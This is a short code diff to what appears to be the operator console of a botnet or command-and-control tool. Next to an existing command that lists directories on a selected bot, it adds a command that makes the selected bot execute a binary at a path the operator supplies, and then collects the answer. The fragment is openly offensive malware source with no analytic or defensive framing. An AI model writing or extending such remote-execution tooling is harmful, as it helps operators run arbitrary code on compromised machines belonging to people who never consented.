@@ -49,8 +49,15 @@ class Controller:
                 if self.current_bot is None:
                     print("No bot selected")
                     continue
-                path = input("Enter a path of the directory")
+                path = input("Enter path of the directory: ")
                 command_id = self.send_command(cmd.COMMAND_DIRECTORY["command"], None, path)
+                self.listen_for_answer(command_id)
+            elif command == cmd.COMMAND_RUN["name"]:
+                if self.current_bot is None:
+                    print("No bot selected")
+                    continue
+                path = input("Enter path of the binary to execute: ")
+                command_id = self.send_command(cmd.COMMAND_RUN["command"], None, path)
                 self.listen_for_answer(command_id)
             elif command == cmd.COMMAND_EXIT["name"]:
                 print("Exiting...")
